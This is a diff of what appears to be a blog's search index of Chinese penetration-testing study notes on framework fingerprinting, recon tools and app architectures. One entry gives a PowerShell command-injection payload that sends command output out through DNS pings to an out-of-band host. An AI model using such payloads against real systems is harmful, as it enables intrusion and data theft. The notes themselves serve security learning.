+<h2 id="Python-开发框架-Django-Flask"><a href="#Python-开发框架-Django-Flask" class="headerlink" title="Python-开发框架-Django&amp;Flask"></a>Python-开发框架-Django&amp;Flask</h2><p><strong>Django</strong></p>
+<ol>
+<li>浏览器识别插件</li>
+<li>数据包里有： <code>Set-Cookie:csrftoken=</code> （有的会隐藏，常规有的。不能通过唯一来判断）</li>
+</ol>
+<p><strong>Flask</strong></p>
+<ol>
+<li>浏览器识别插件</li>
+<li>数据包里有：<code>Etag:flask</code>（有的会隐藏，常规有的。不能通过唯一来判断）<br>
+<br></li>
+</ol>
+<h2 id="PHP-开发框架-ThinkPHP-Laravel-Yii"><a href="#PHP-开发框架-ThinkPHP-Laravel-Yii" class="headerlink" title="PHP-开发框架-ThinkPHP&amp;Laravel&amp;Yii"></a>PHP-开发框架-ThinkPHP&amp;Laravel&amp;Yii</h2><p><strong>ThinkPHP</strong>：</p>
+<ol>
+<li>浏览器识别插件</li>
+<li>数据包里有：<code>X-Powered-By: ThinkPHP</code>（有的会隐藏，常规有的。不能通过这唯一来判断）</li>
+<li>CMS识别到源码体系TP开发</li>
+</ol>
+<p><strong>Laravel</strong>：</p>
+<ol>
+<li>浏览器识别插件</li>
+<li>数据包里有：<code>Set-Cookie：Laravel_sesssion=</code>（有的会隐藏，常规有的。不能通过唯一来判断）</li>
+</ol>
+<p><strong>Yii</strong>:</p>
+<ol>
+<li>浏览器识别插件</li>
+<li>数据包里有：<code>Set-Cookie：Yii_sesssion=</code>（有的会隐藏，常规有的。不能通过唯一来判断）<br></li>
+</ol>
+<h2 id="Java-框架组件-Fastjson-Shiro-Solr-Spring"><a href="#Java-框架组件-Fastjson-Shiro-Solr-Spring" class="headerlink" title="Java-框架组件-Fastjson&amp;Shiro&amp;Solr&amp;Spring"></a>Java-框架组件-Fastjson&amp;Shiro&amp;Solr&amp;Spring</h2><p><a href="https://blog.csdn.net/agonie201218/article/details/125300729">52类110个主流Java组件和框架介绍</a><br><br></p>
+<p><strong>Fastjson&#x2F;Jackson</strong>:<br>在提交JSON数据包中修改测试：<br>Fastjson组件会把01解析成1<br>Jackson组件在解析01时会抛出异常<br><br></p>
+<p><strong>Shiro</strong>:<br>请求包的cookie中存在rememberMe字段<br>返回包中存在<code>set-Cookie：remeberMe=deleteMe</code><br>请求包中存在<code>rememberMe=x</code>时，响应包中存在<code>rememberMe=deleteMe</code><br>有时候服务器不会主动返回<code>remeberMe=deleteMe</code>，直接发包即可，将Cookie内容改为<code>remember Me=1</code>，若相应包有<code>rememberMe=deleteMe</code>，则基本可以确定网站apache shiro搭建的。<br><br></p>
+<p><strong>Struts2</strong>:<br>一般使用struts2框架的网页地址后缀带do或action，可以尝试进行利用<br><br></p>
+<p><strong>Springboot</strong>:<br>1.通过web应用程序网页标签的小绿叶图标<br>2.通过springboot框架默认报错页面<br><br></p>
+<p><strong>Solr</strong>：<br>一般开放8983端口,访问页面也可以探针到</p>
+]]></content>
+      <categories>
+        <category>信息打点</category>
+      </categories>
+  </entry>
+  <entry>
     <title>APP资产&amp;知识产权&amp;应用监控&amp;静态提取&amp;动态抓包&amp;动态调试</title>
     <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B97/</url>
     <content><![CDATA[<h2 id="名称获取App信息（爱企查-小蓝本-七麦-点点）"><a href="#名称获取App信息（爱企查-小蓝本-七麦-点点）" class="headerlink" title="名称获取App信息（爱企查&#x2F;小蓝本&#x2F;七麦&#x2F;点点）"></a>名称获取App信息（爱企查&#x2F;小蓝本&#x2F;七麦&#x2F;点点）</h2><ol>
@@ -1584,6 +1599,52 @@
 <p>优点：没有误报，解决不能抓包不能代理等情况</p>
 <p>优点：搞逆向的人能看到实时的app调用链等</p>
 <p>缺点：无法做到完整</p>
+]]></content>
+      <categories>
+        <category>信息打点</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>红蓝队自动化项目&amp;资产侦察&amp;武器库部署&amp;企查产权&amp;网络空间</title>
+    <url>/2024/03/11/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B99/</url>
+    <content><![CDATA[<h2 id="各类红蓝队优秀工具项目集合："><a href="#各类红蓝队优秀工具项目集合：" class="headerlink" title="各类红蓝队优秀工具项目集合："></a>各类红蓝队优秀工具项目集合：</h2><p><a href="https://github.com/guchangan1/All-Defense-Tool">All-Defense-Tool</a></p>
+<p>本项目集成了全网优秀的开源攻防武器项目，包含信息收集工具（自动化利用工具、资产发现工具、目录扫描工具、子域名收集工具、指纹识别工具、端口扫描工具、各种插件…），漏洞利用工具（各大CMS利用工具、中间件利用工具等项目…），内网渗透工具（隧道代理、密码提取…）、应急响应工具、甲方运维工具、等其他安全攻防资料整理，供攻防双方使用。如果你有更好的建议，欢迎提出请求。<br><br></p>
+<h2 id="自动化-武器库部署-F8x"><a href="#自动化-武器库部署-F8x" class="headerlink" title="自动化-武器库部署-F8x"></a>自动化-武器库部署-F8x</h2><p><a href="https://github.com/ffffffff0x/f8x">F8x</a></p>
+<ol>
+<li>介绍：<br>一款红&#x2F;蓝队环境自动化部署工具,支持多种场景,渗透,开发,代理环境,服务可选项等.</li>
+<li>配置：<br>wget : wget -O f8x <a href="https://f8x.io/">https://f8x.io/</a><br>curl : curl -o f8x <a href="https://f8x.io/">https://f8x.io/</a></li>
+<li>使用：<br>见项目文档<br>
+<br></li>
+</ol>
+<h2 id="自动化-网络空间-AsamF"><a href="#自动化-网络空间-AsamF" class="headerlink" title="自动化-网络空间-AsamF"></a>自动化-网络空间-AsamF</h2><p><a href="https://github.com/Kento-Sec/AsamF">AsamF</a></p>
+<ol>
+<li>介绍：<br>AsamF集成了Fofa、Hunter、Quake、Zoomeye、Shodan、爱企查、Chinaz、0.zone、subfinder。AsamF支持<br>Fofa、Hunter、Quake、Zoomeye、Shodan、Chinaz、0.zone配置多个Key。</li>
+<li>配置：<br>AsamF会在&#x2F;.config&#x2F;asamf&#x2F;目录下生成config.json文件。<br>如果你有多个key，按照json的格式录入即可，建议键值按照阿拉伯数字依次录入,方便以阿拉伯数字来切换key。自动结果保存在&#x2F;asamf&#x2F;目录下。</li>
+<li>使用：<br>见项目文档<br>
+<br></li>
+</ol>
+<h2 id="自动化-企查信息-ENScan-GO"><a href="#自动化-企查信息-ENScan-GO" class="headerlink" title="自动化-企查信息-ENScan_GO"></a>自动化-企查信息-ENScan_GO</h2><p><a href="https://github.com/wgpsec/ENScan_GO">ENScan_GO</a></p>
+<ol>
+<li>介绍：<br>剑指HW&#x2F;SRC，解决在HW&#x2F;SRC场景下遇到的各种针对国内企业信息收集难题</li>
+<li>配置：<br>ENScanGo在第一次使用时需要使用-v命令生成配置文件信息后进行配置</li>
+<li>使用：<br>见项目文档<br>
+<br></li>
+</ol>
+<h2 id="自动化-综合架构-ARL-Nemo"><a href="#自动化-综合架构-ARL-Nemo" class="headerlink" title="自动化-综合架构-ARL&amp;Nemo"></a>自动化-综合架构-ARL&amp;Nemo</h2><p><a href="https://github.com/TophantTechnology/ARL">ARL</a></p>
+<ol>
+<li>介绍：<br>旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</li>
+<li>配置：（docker搭建）<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/TophantTechnology/ARL</span><br><span class="line"><span class="built_in">cd</span> ARL/docker/</span><br><span class="line">docker volume create arl_db</span><br><span class="line">docker-compose pull</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<br></li>
+</ol>
+<p><a href="https://github.com/hanc00l/nemo_go">Nemo_Go</a></p>
+<ol>
+<li><p>介绍：<br>Nemo是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率，用Golang完全重构了原Python版本。</p>
+</li>
+<li><p>配置：（docker搭建）<br><a href="https://github.com/hanc00l/nemo_go/blob/main/docs/docker.md">https://github.com/hanc00l/nemo_go/blob/main/docs/docker.md</a><br>下载release的nemo_linux_amd64.tar后执行：<br>mkdir nemo;tar xvf nemo_linux_amd64.tar -C nemo;cd nemo<br>docker-compose up -d</p>
+</li>
+<li><p>Bug：网络空间（配置后要重启）<br><a href="https://github.com/hanc00l/nemo_go/issues/72">https://github.com/hanc00l/nemo_go/issues/72</a></p>
+</li>
+</ol>
 ]]></content>
       <categories>
         <category>信息打点</category>
@@ -1713,114 +1774,6 @@
 <h2 id="小程序多功能组手"><a href="#小程序多功能组手" class="headerlink" title="小程序多功能组手"></a>小程序多功能组手</h2><p><a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/stable.html">微信官方开发工具</a></p>
 <p>复杂操作复现：<a href="https://www.cnblogs.com/oodcloud/p/16964878.html">https://www.cnblogs.com/oodcloud/p/16964878.html</a></p>
 <p>简单工具复现：<a href="http://xcx.siqingw.top/">http://xcx.siqingw.top/</a></p>
-]]></content>
-      <categories>
-        <category>信息打点</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>语言框架&amp;开发组件&amp;FastJson&amp;Shiro&amp;Log4j&amp;SpringBoot等</title>
-    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B96/</url>
-    <content><![CDATA[<h2 id="重点知识-框架-Web-前端-后端"><a href="#重点知识-框架-Web-前端-后端" class="headerlink" title="重点知识-框架&amp;Web&amp;前端&amp;后端"></a>重点知识-框架&amp;Web&amp;前端&amp;后端</h2><p><strong>框架</strong>：简单代码的一个整合库，如果使用框架就只需要学习使用如何调用框架即可</p>
-<p>例如：文件上传功能是需要很多代码来实现的，框架意思是把这个代码进行封封装，以后调用就可以了</p>
-<p><strong>影响</strong>：如果采用框架开发，代码的安全性是取决于框架的过滤机制</p>
-<p><strong>组件</strong>：第三方的功能模块（日志记录，数据监控，数据转换等）<br><br></p>
-<p><strong>Web架构</strong>：</p>
-<ol>
-<li>最简单最入门的开发模型（功能代码全部手写）<br>最容易出现漏洞，因为程序员水平不一，没有第三方或团队的检查代码，单纯的自己写</li>
-<li>结合开发框架的开发模型（以框架为核心实现功能）<br>第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架漏洞）</li>
-<li>结合开发框架外加组件模型（以框架为核心，组件为辅实现功能）<br>第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架和组件漏洞）<br>
-<br></li>
-</ol>
-<p><strong>前端</strong><br><strong>JS 框架</strong>：爬取更多的JS从里面筛选URL或敏感泄漏Key等，也可以通过对JS代码逻辑进行代码审计</p>
-<p><strong>组件</strong>：Java居多，常见报过有安全漏洞组件（shiro solr log4j sprintboot等）</p>
-<p><strong>框架</strong>：PHP Java Python都有<br><br></p>
-<p><strong>后端</strong><br><strong>CMS识别</strong>：一般PHP开发居多（利用源码程序名去搜漏洞情况，或者下载源码去进行后期的代码审计）<br><br></p>
-<h2 id="指纹识别-本地工具-gotoScan（CMSEEK）"><a href="#指纹识别-本地工具-gotoScan（CMSEEK）" class="headerlink" title="指纹识别-本地工具-gotoScan（CMSEEK）"></a>指纹识别-本地工具-gotoScan（CMSEEK）</h2><ol>
-<li><a href="https://github.com/newbe3three/gotoscan">gotoscan</a>，本地工具适用于内网和外网环境</li>
-<li>网络空间：Fofa Quake Hunter</li>
-<li>网络空间：IO图标关系<br>
-<br></li>
-</ol>
-<h2 id="Python-开发框架-Django-Flask"><a href="#Python-开发框架-Django-Flask" class="headerlink" title="Python-开发框架-Django&amp;Flask"></a>Python-开发框架-Django&amp;Flask</h2><p><strong>Django</strong></p>
-<ol>
-<li>浏览器识别插件</li>
-<li>数据包里有： <code>Set-Cookie:csrftoken=</code> （有的会隐藏，常规有的。不能通过唯一来判断）</li>
-</ol>
-<p><strong>Flask</strong></p>
-<ol>
-<li>浏览器识别插件</li>
-<li>数据包里有：<code>Etag:flask</code>（有的会隐藏，常规有的。不能通过唯一来判断）<br>
-<br></li>
-</ol>
-<h2 id="PHP-开发框架-ThinkPHP-Laravel-Yii"><a href="#PHP-开发框架-ThinkPHP-Laravel-Yii" class="headerlink" title="PHP-开发框架-ThinkPHP&amp;Laravel&amp;Yii"></a>PHP-开发框架-ThinkPHP&amp;Laravel&amp;Yii</h2><p><strong>ThinkPHP</strong>：</p>
-<ol>
-<li>浏览器识别插件</li>
-<li>数据包里有：<code>X-Powered-By: ThinkPHP</code>（有的会隐藏，常规有的。不能通过这唯一来判断）</li>
-<li>CMS识别到源码体系TP开发</li>
-</ol>
-<p><strong>Laravel</strong>：</p>
-<ol>
-<li>浏览器识别插件</li>
-<li>数据包里有：<code>Set-Cookie：Laravel_sesssion=</code>（有的会隐藏，常规有的。不能通过唯一来判断）</li>
-</ol>
-<p><strong>Yii</strong>:</p>
-<ol>
-<li>浏览器识别插件</li>
-<li>数据包里有：<code>Set-Cookie：Yii_sesssion=</code>（有的会隐藏，常规有的。不能通过唯一来判断）<br></li>
-</ol>
-<h2 id="Java-框架组件-Fastjson-Shiro-Solr-Spring"><a href="#Java-框架组件-Fastjson-Shiro-Solr-Spring" class="headerlink" title="Java-框架组件-Fastjson&amp;Shiro&amp;Solr&amp;Spring"></a>Java-框架组件-Fastjson&amp;Shiro&amp;Solr&amp;Spring</h2><p><a href="https://blog.csdn.net/agonie201218/article/details/125300729">52类110个主流Java组件和框架介绍</a><br><br></p>
-<p><strong>Fastjson&#x2F;Jackson</strong>:<br>在提交JSON数据包中修改测试：<br>Fastjson组件会把01解析成1<br>Jackson组件在解析01时会抛出异常<br><br></p>
-<p><strong>Shiro</strong>:<br>请求包的cookie中存在rememberMe字段<br>返回包中存在<code>set-Cookie：remeberMe=deleteMe</code><br>请求包中存在<code>rememberMe=x</code>时，响应包中存在<code>rememberMe=deleteMe</code><br>有时候服务器不会主动返回<code>remeberMe=deleteMe</code>，直接发包即可，将Cookie内容改为<code>remember Me=1</code>，若相应包有<code>rememberMe=deleteMe</code>，则基本可以确定网站apache shiro搭建的。<br><br></p>
-<p><strong>Struts2</strong>:<br>一般使用struts2框架的网页地址后缀带do或action，可以尝试进行利用<br><br></p>
-<p><strong>Springboot</strong>:<br>1.通过web应用程序网页标签的小绿叶图标<br>2.通过springboot框架默认报错页面<br><br></p>
-<p><strong>Solr</strong>：<br>一般开放8983端口,访问页面也可以探针到</p>
-]]></content>
-      <categories>
-        <category>信息打点</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>红蓝队自动化项目&amp;资产侦察&amp;武器库部署&amp;企查产权&amp;网络空间</title>
-    <url>/2024/03/11/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B99/</url>
-    <content><![CDATA[<h2 id="各类红蓝队优秀工具项目集合："><a href="#各类红蓝队优秀工具项目集合：" class="headerlink" title="各类红蓝队优秀工具项目集合："></a>各类红蓝队优秀工具项目集合：</h2><p><a href="https://github.com/guchangan1/All-Defense-Tool">All-Defense-Tool</a></p>
-<p>本项目集成了全网优秀的开源攻防武器项目，包含信息收集工具（自动化利用工具、资产发现工具、目录扫描工具、子域名收集工具、指纹识别工具、端口扫描工具、各种插件…），漏洞利用工具（各大CMS利用工具、中间件利用工具等项目…），内网渗透工具（隧道代理、密码提取…）、应急响应工具、甲方运维工具、等其他安全攻防资料整理，供攻防双方使用。如果你有更好的建议，欢迎提出请求。<br><br></p>
-<h2 id="自动化-武器库部署-F8x"><a href="#自动化-武器库部署-F8x" class="headerlink" title="自动化-武器库部署-F8x"></a>自动化-武器库部署-F8x</h2><p><a href="https://github.com/ffffffff0x/f8x">F8x</a></p>
-<ol>
-<li>介绍：<br>一款红&#x2F;蓝队环境自动化部署工具,支持多种场景,渗透,开发,代理环境,服务可选项等.</li>
-<li>配置：<br>wget : wget -O f8x <a href="https://f8x.io/">https://f8x.io/</a><br>curl : curl -o f8x <a href="https://f8x.io/">https://f8x.io/</a></li>
-<li>使用：<br>见项目文档<br>
-<br></li>
-</ol>
-<h2 id="自动化-网络空间-AsamF"><a href="#自动化-网络空间-AsamF" class="headerlink" title="自动化-网络空间-AsamF"></a>自动化-网络空间-AsamF</h2><p><a href="https://github.com/Kento-Sec/AsamF">AsamF</a></p>
-<ol>
-<li>介绍：<br>AsamF集成了Fofa、Hunter、Quake、Zoomeye、Shodan、爱企查、Chinaz、0.zone、subfinder。AsamF支持<br>Fofa、Hunter、Quake、Zoomeye、Shodan、Chinaz、0.zone配置多个Key。</li>
-<li>配置：<br>AsamF会在&#x2F;.config&#x2F;asamf&#x2F;目录下生成config.json文件。<br>如果你有多个key，按照json的格式录入即可，建议键值按照阿拉伯数字依次录入,方便以阿拉伯数字来切换key。自动结果保存在&#x2F;asamf&#x2F;目录下。</li>
-<li>使用：<br>见项目文档<br>
-<br></li>
-</ol>
-<h2 id="自动化-企查信息-ENScan-GO"><a href="#自动化-企查信息-ENScan-GO" class="headerlink" title="自动化-企查信息-ENScan_GO"></a>自动化-企查信息-ENScan_GO</h2><p><a href="https://github.com/wgpsec/ENScan_GO">ENScan_GO</a></p>
-<ol>
-<li>介绍：<br>剑指HW&#x2F;SRC，解决在HW&#x2F;SRC场景下遇到的各种针对国内企业信息收集难题</li>
-<li>配置：<br>ENScanGo在第一次使用时需要使用-v命令生成配置文件信息后进行配置</li>
-<li>使用：<br>见项目文档<br>
-<br></li>
-</ol>
-<h2 id="自动化-综合架构-ARL-Nemo"><a href="#自动化-综合架构-ARL-Nemo" class="headerlink" title="自动化-综合架构-ARL&amp;Nemo"></a>自动化-综合架构-ARL&amp;Nemo</h2><p><a href="https://github.com/TophantTechnology/ARL">ARL</a></p>
-<ol>
-<li>介绍：<br>旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</li>
-<li>配置：（docker搭建）<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/TophantTechnology/ARL</span><br><span class="line"><span class="built_in">cd</span> ARL/docker/</span><br><span class="line">docker volume create arl_db</span><br><span class="line">docker-compose pull</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<br></li>
-</ol>
-<p><a href="https://github.com/hanc00l/nemo_go">Nemo_Go</a></p>
-<ol>
-<li><p>介绍：<br>Nemo是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率，用Golang完全重构了原Python版本。</p>
-</li>
-<li><p>配置：（docker搭建）<br><a href="https://github.com/hanc00l/nemo_go/blob/main/docs/docker.md">https://github.com/hanc00l/nemo_go/blob/main/docs/docker.md</a><br>下载release的nemo_linux_amd64.tar后执行：<br>mkdir nemo;tar xvf nemo_linux_amd64.tar -C nemo;cd nemo<br>docker-compose up -d</p>
-</li>
-<li><p>Bug：网络空间（配置后要重启）<br><a href="https://github.com/hanc00l/nemo_go/issues/72">https://github.com/hanc00l/nemo_go/issues/72</a></p>
-</li>
-</ol>
 ]]></content>
       <categories>
         <category>信息打点</category>
@@ -2045,31 +1998,6 @@
       </categories>
   </entry>
   <entry>
-    <title>APP架构&amp;小程序&amp;H5+Vue语言&amp;Web封装&amp;原生开发&amp;Flutter</title>
-    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A84/</url>
-    <content><![CDATA[<h2 id="APP应用开发架构："><a href="#APP应用开发架构：" class="headerlink" title="APP应用开发架构："></a>APP应用开发架构：</h2><ol>
-<li><p>原生开发<br>安卓一般使用Java语言开发，当然现在也有Kotlin语言进行开发。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。</p>
-</li>
-<li><p>使用HTML5语言开发<br>使用HTML5开发的好处有很多，可多端复用，比如浏览器端，iOS端，当然HTML5开发是没有原生好的。</p>
-</li>
-<li><p>使用Flutter开发<br>Flutter是近年来谷歌推出的一款UI框架，使用Dart语言进行开发，支持跨平台，体验可媲美原生。但是Flutter技术比较新，生态还不完善，开发效率相对偏低。</p>
-</li>
-<li><p>常规Web开发<br>Web App软件开发简单地说，就是开发一个网站，然后加入App的壳。Web App一般非常小，内容都是App内的网页展示。受制于网页技术本身，可实现功能少，每次打开，几乎所有的内容都需要重新加载，反应速度慢，内容加载过多就容易卡死，用户体验差，而且App内的交互设计等非常有效。但开发周期短，需要的技术人员少，成本低。使用网上的一门，变色龙网站等，可以把电脑网站转成手机App版本。</p>
-<br>
-<br></li>
-</ol>
-<h2 id="APP-开发架构-原生态-IDEA"><a href="#APP-开发架构-原生态-IDEA" class="headerlink" title="APP-开发架构-原生态-IDEA"></a>APP-开发架构-原生态-IDEA</h2><p>开发难度是最难的，但是效果是最好的</p>
-<p><strong>安全影响</strong>：需要反编译 &amp; 抓包 &amp; 提取出资产信息测试，逆向的角度去分析逻辑设计的安全性。<br><br></p>
-<h2 id="APP-开发架构–Web封装-封装平台"><a href="#APP-开发架构–Web封装-封装平台" class="headerlink" title="APP-开发架构–Web封装-封装平台"></a>APP-开发架构–Web封装-封装平台</h2><p><strong>安全影响</strong>：本身就是Web，进行抓包Web安全测试即可<br><br></p>
-<h2 id="APP-开发架构-HTML5-Vue-HBuilderX"><a href="#APP-开发架构-HTML5-Vue-HBuilderX" class="headerlink" title="APP-开发架构-HTML5&amp;Vue-HBuilderX"></a>APP-开发架构-HTML5&amp;Vue-HBuilderX</h2><p><strong>安全影响</strong>：API &amp; JS框架安全问题 &amp; JS前端测试，前后端分离，JS渗透测试，接口安全，框架安全测试<br><br></p>
-<h2 id="WX小程序-开发架构-Web封装-平台"><a href="#WX小程序-开发架构-Web封装-平台" class="headerlink" title="WX小程序-开发架构-Web封装-平台"></a>WX小程序-开发架构-Web封装-平台</h2><p><strong>安全影响</strong>：本身就是Web，进行Web抓包安全测试即可<br><br></p>
-<h2 id="WX小程序-开发架构-H5-Vue-HBuilderX"><a href="#WX小程序-开发架构-H5-Vue-HBuilderX" class="headerlink" title="WX小程序-开发架构-H5&amp;Vue-HBuilderX"></a>WX小程序-开发架构-H5&amp;Vue-HBuilderX</h2><p><strong>安全影响</strong>：API &amp; JS框架安全问题 &amp; JS前端测试</p>
-]]></content>
-      <categories>
-        <category>基础入门</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Web架构&amp;OSS存储&amp;负载均衡&amp;CDN加速&amp;反向代理&amp;WAF防护</title>
     <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A83/</url>
     <content><![CDATA[<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p><strong>原理</strong>：Web应用防火墙，旨在提供保护</p>
@@ -2112,6 +2040,31 @@
 <p><strong>注意</strong>：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理服务器可能会根据自己的配置将请求发送给任意的后端服务器，而不一定是客户端请求的目标资源的真实应用服务器<br><br></p>
 <h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p><strong>原理</strong>：分摊到多个服务器来支撑服务，共同完成工作任务，一台服务器崩了还有备份</p>
 <p><strong>影响</strong>：有多个服务器加载服务，会测试过程中存在多个目标情况</p>
+]]></content>
+      <categories>
+        <category>基础入门</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>APP架构&amp;小程序&amp;H5+Vue语言&amp;Web封装&amp;原生开发&amp;Flutter</title>
+    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A84/</url>
+    <content><![CDATA[<h2 id="APP应用开发架构："><a href="#APP应用开发架构：" class="headerlink" title="APP应用开发架构："></a>APP应用开发架构：</h2><ol>
+<li><p>原生开发<br>安卓一般使用Java语言开发，当然现在也有Kotlin语言进行开发。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。</p>
+</li>
+<li><p>使用HTML5语言开发<br>使用HTML5开发的好处有很多，可多端复用，比如浏览器端，iOS端，当然HTML5开发是没有原生好的。</p>
+</li>
+<li><p>使用Flutter开发<br>Flutter是近年来谷歌推出的一款UI框架，使用Dart语言进行开发，支持跨平台，体验可媲美原生。但是Flutter技术比较新，生态还不完善，开发效率相对偏低。</p>
+</li>
+<li><p>常规Web开发<br>Web App软件开发简单地说，就是开发一个网站，然后加入App的壳。Web App一般非常小，内容都是App内的网页展示。受制于网页技术本身，可实现功能少，每次打开，几乎所有的内容都需要重新加载，反应速度慢，内容加载过多就容易卡死，用户体验差，而且App内的交互设计等非常有效。但开发周期短，需要的技术人员少，成本低。使用网上的一门，变色龙网站等，可以把电脑网站转成手机App版本。</p>
+<br>
+<br></li>
+</ol>
+<h2 id="APP-开发架构-原生态-IDEA"><a href="#APP-开发架构-原生态-IDEA" class="headerlink" title="APP-开发架构-原生态-IDEA"></a>APP-开发架构-原生态-IDEA</h2><p>开发难度是最难的，但是效果是最好的</p>
+<p><strong>安全影响</strong>：需要反编译 &amp; 抓包 &amp; 提取出资产信息测试，逆向的角度去分析逻辑设计的安全性。<br><br></p>
+<h2 id="APP-开发架构–Web封装-封装平台"><a href="#APP-开发架构–Web封装-封装平台" class="headerlink" title="APP-开发架构–Web封装-封装平台"></a>APP-开发架构–Web封装-封装平台</h2><p><strong>安全影响</strong>：本身就是Web，进行抓包Web安全测试即可<br><br></p>
+<h2 id="APP-开发架构-HTML5-Vue-HBuilderX"><a href="#APP-开发架构-HTML5-Vue-HBuilderX" class="headerlink" title="APP-开发架构-HTML5&amp;Vue-HBuilderX"></a>APP-开发架构-HTML5&amp;Vue-HBuilderX</h2><p><strong>安全影响</strong>：API &amp; JS框架安全问题 &amp; JS前端测试，前后端分离，JS渗透测试，接口安全，框架安全测试<br><br></p>
+<h2 id="WX小程序-开发架构-Web封装-平台"><a href="#WX小程序-开发架构-Web封装-平台" class="headerlink" title="WX小程序-开发架构-Web封装-平台"></a>WX小程序-开发架构-Web封装-平台</h2><p><strong>安全影响</strong>：本身就是Web，进行Web抓包安全测试即可<br><br></p>
+<h2 id="WX小程序-开发架构-H5-Vue-HBuilderX"><a href="#WX小程序-开发架构-H5-Vue-HBuilderX" class="headerlink" title="WX小程序-开发架构-H5&amp;Vue-HBuilderX"></a>WX小程序-开发架构-H5&amp;Vue-HBuilderX</h2><p><strong>安全影响</strong>：API &amp; JS框架安全问题 &amp; JS前端测试</p>
 ]]></content>
       <categories>
         <category>基础入门</category>
@@ -2193,6 +2146,36 @@
 <p>需要replace “\” 为字母或其他来分割带外出来的数据</p>
 <p>最后就可以结果带出来了，ping到带外网站就可以直接带出Windows的数据了</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$x</span>=<span class="built_in">whoami</span></span><br><span class="line"><span class="variable">$x</span>=<span class="variable">$x</span>.Replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"><span class="variable">$y</span>=<span class="string">&#x27;.47fa801887.ipv6.1433.eu.org.&#x27;</span></span><br><span class="line"><span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span></span><br><span class="line">ping <span class="variable">$z</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#组合起来</span></span><br><span class="line">127.0.0.1 | powershell <span class="variable">$x</span>=<span class="built_in">dir</span>;<span class="variable">$x</span>=<span class="variable">$x</span>.Replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>);<span class="variable">$y</span>=<span class="string">&#x27;.47fa801887.ipv6.1433.eu.org.&#x27;</span>;<span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;ping <span class="variable">$z</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>基础入门</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>抓包技术&amp;全局协议&amp;封包监听&amp;网卡模式&amp;APP&amp;小程序&amp;PC应用</title>
+    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A87/</url>
+    <content><![CDATA[<h2 id="实现目的："><a href="#实现目的：" class="headerlink" title="实现目的："></a>实现目的：</h2><ol>
+<li>掌握几种全局协议抓包工具的使用</li>
+<li>学会App，小程序，PC应用等协议抓包</li>
+<li>了解此课抓包是针对那些目标什么协议<br>
+<br></li>
+</ol>
+<h2 id="Wireshark："><a href="#Wireshark：" class="headerlink" title="Wireshark："></a>Wireshark：</h2><p>Wireshark是一个网络封包分析软件。网络封包分析软件的功能是截取网络封包，并显示出详细的网络封包资料。Wireshark使用WinPcap作为接口，直接与网卡进行数据交换。<br><br></p>
+<h2 id="科来网络分析系统："><a href="#科来网络分析系统：" class="headerlink" title="科来网络分析系统："></a>科来网络分析系统：</h2><p>科来是一款由自主研发的网络分析产品。该系统具有专家分析技术，通过捕获并分析网络中传输的底层数据包，对网络故障，网络安全以及网络性能进行全面分析，从而快速排查网络中出现或潜在的故障，安全及性能问题。<br><br></p>
+<h2 id="WPE封包分析："><a href="#WPE封包分析：" class="headerlink" title="WPE封包分析："></a>WPE封包分析：</h2><p>封包监听工具是网络封包编辑器，WPE可以截取网络上的信息，修改封包数据，是外挂制作的常用工具。一般在安全测试中用来调试数据通讯地址。<br><br></p>
+<p><strong>渗透测试角度</strong>：</p>
+<ol>
+<li>抓包得到应用的资产信息，IP域名等</li>
+<li>拿IP和域名上的服务做测试（Web攻防，端口，数据库等第三方软件）</li>
+<li>API接口，OSS资源<br>
+<br></li>
+</ol>
+<p><strong>逆向破解角度</strong>：</p>
+<ol>
+<li>反编译源码中去找资产信息 跟渗透测试思路一样</li>
+<li>源码中泄露的配置Key去测试安全性</li>
+<li>逆向检查代码和产品的设计逻辑性（不规范的加密，可以绕过的策略，自己可以删除验证重新打包绕过验证等）</li>
+</ol>
+]]></content>
